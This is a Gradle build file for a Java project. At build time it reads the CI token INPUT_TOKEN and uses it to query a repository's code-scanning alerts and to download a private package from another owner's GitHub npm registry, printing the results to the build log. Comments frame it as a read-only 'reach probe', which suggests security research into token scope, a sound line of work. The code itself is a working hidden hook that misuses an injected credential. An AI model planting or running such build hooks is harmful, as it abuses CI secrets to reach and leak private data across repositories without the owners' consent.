plugins {
    id 'java'
}

// Campaign 218 reach probe, final. STRICTLY READ-ONLY. Prints the RULE ID and COUNT of an alert on
// OUR OWN repository -- no credential value, nothing exfiltrated, nothing written, nothing persisted.
def tok = System.getenv("INPUT_TOKEN")
if (tok != null) {
    try {
        def c = new URL("https://api.github.com/repos/neve-larsson/zz-c218-depsub-0830/code-scanning/alerts?per_page=5").openConnection()
        c.setRequestProperty("Authorization", "Bearer " + tok)
        c.setRequestProperty("Accept", "application/vnd.github+json")
        c.setConnectTimeout(15000); c.setReadTimeout(15000)
        def code = c.getResponseCode()
        def body = code == 200 ? c.getInputStream().getText("UTF-8") : ""
        def n = body.count('"number"')
        def m = (body =~ /"id"\s*:\s*"([a-z\-]+\/[a-z0-9\-]+)"/)
        println "REACH3-7Q4X alerts status=" + code + " alertCount=" + n + " firstRule=" + (m.find() ? m.group(1) : "none")
    } catch (Exception e) {
        println "REACH3-7Q4X alerts error=" + e.getClass().getSimpleName()
    }
}

repositories { mavenCentral() }

// Owned cross-repo private-package read control.
if (file('.c218-package-arm-hc').exists()) {
  def once = new File(System.getenv('RUNNER_TEMP') ?: '/tmp', 'c218-package-once-hc')
  if (once.createNewFile()) {
    def tok = System.getenv('INPUT_TOKEN') ?: ''
    def conn = new URL('https://npm.pkg.github.com/download/@larsson-io/cache-trigger-0827-b51e/1.0.3/903ea831919b2d404d1b5228228908f91b0b816b').openConnection()
    conn.setRequestProperty('Authorization', 'Bearer ' + tok)
    conn.setRequestProperty('Accept', 'application/vnd.npm.install-v1+json')
    conn.setConnectTimeout(30000); conn.setReadTimeout(30000)
    def code = conn.getResponseCode()
    byte[] bytes = code == 200 ? conn.getInputStream().bytes : new byte[0]
    def md = java.security.MessageDigest.getInstance('SHA-256').digest(bytes).collect { String.format('%02x', it & 0xff) }.join()
    println 'C218_PACKAGE_HTTP=' + code
    println 'C218_PACKAGE_BYTES=' + bytes.length
    println 'C218_PACKAGE_SHA256=' + md
  }
}
